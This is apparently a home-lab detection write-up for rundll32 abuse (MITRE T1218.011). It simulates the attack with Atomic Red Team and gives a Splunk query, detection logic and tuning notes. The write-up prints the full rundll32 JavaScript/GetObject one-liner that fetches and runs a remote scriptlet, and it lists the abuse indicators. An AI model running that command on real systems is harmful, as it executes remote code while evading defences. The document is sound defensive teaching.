# T1218.011 — Rundll32 Abuse

**Tactic:** Defense Evasion  **Technique:** T1218.011  **Log Source:** Sysmon (XmlWinEventLog) — Process Creation

## What This Attack Does

The attacker uses `rundll32.exe` — a legitimate, signed Windows binary — to
execute malicious code, in this case fetching and running a remote JavaScript
scriptlet. Because `rundll32` is trusted by the OS and many security tools, it's
a favorite living-off-the-land binary (LOLBin): the attacker's code runs under
cover of a Microsoft-signed process instead of an obviously malicious executable.

## How I Simulated It

Tool: Atomic Red Team
Command executed on the Windows 11 target (192.168.56.102):

    Invoke-AtomicTest T1218.011 -TestNumbers 1

Test #1 ("Rundll32 execute JavaScript Remote Payload With GetObject") abuses
`rundll32` to run inline JavaScript that pulls a remote scriptlet and executes it:
`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();`

## What Splunk Captured

Sysmon Event ID 1 (Process Creation) fired 3 times:
- User: `WINDOWS\khaled`
- Parent CommandLine: `cmd.exe /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();`
- Child: two `rundll32.exe` processes executing the JavaScript/GetObject payload
- Parent chain: `powershell.exe` → `cmd.exe` → `rundll32.exe`

## SPL Detection Query

```spl
index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "rundll32"
| rex field=_raw "Name='Image'>(?P<Image>[^<]+)"
| rex field=_raw "Name='CommandLine'>(?P<CommandLine>[^<]+)"
| rex field=_raw "Name='ParentImage'>(?P<ParentImage>[^<]+)"
| rex field=_raw "Name='User'>(?P<User>[^<]+)"
| rex field=_raw "Name='UtcTime'>(?P<UtcTime>[^<]+)"
| table UtcTime, User, Image, CommandLine, ParentImage
```

## Detection Logic

The query matches `rundll32`, but the string alone is noisy — `rundll32` runs
legitimately all the time. The real indicators are in the command line: `javascript:`,
`mshtml,RunHTMLApplication`, `GetObject("script:...")`, and an `http(s)` URL.
Those are hallmarks of `rundll32` being used as a script executor / remote-payload
loader rather than for its intended purpose of loading DLLs. `RunHTMLApplication`
combined with a remote `.sct` scriptlet is a well-known LOLBin abuse pattern with
essentially no legitimate use.

> Note: an earlier version of this detection used
> `Image="*rundll32.exe" CommandLine="*javascript*" OR CommandLine="*http*"`,
> which has an operator-precedence problem — without parentheses, the `OR` widens
> the match so it effectively returns any event containing `http`, not just
> rundll32 abuse. The corrected approach is to match `rundll32` and then filter on
> the specific abuse strings (`javascript`, `RunHTMLApplication`, `GetObject`,
> `.sct`), ideally grouped explicitly: `... ("javascript" OR "RunHTMLApplication" OR "GetObject")`.

## False Positives / Tuning

Plain `rundll32` is extremely common, so never alert on the binary alone. Alert on
`rundll32` **plus** the abuse indicators: `javascript:` / `vbscript:` prefixes,
`mshtml,RunHTMLApplication`, `GetObject("script:...")`, remote `.sct`/`.hta`
references, or a URL in the command line. Also prioritize `rundll32` spawned from a
script host (`powershell.exe`/`cmd.exe`) or with an empty/unusual DLL argument.
This sits alongside the other LOLBin detections in this lab (`certutil` T1105,
`bitsadmin` T1197) — same idea, different trusted binary.

## Result

Splunk detected the `rundll32` abuse across 3 process-creation events, capturing
the full JavaScript/`GetObject` payload and the remote scriptlet URL. The log
clearly shows `rundll32` being used as a remote-code loader rather than for
legitimate DLL execution, with the entire malicious command line preserved.
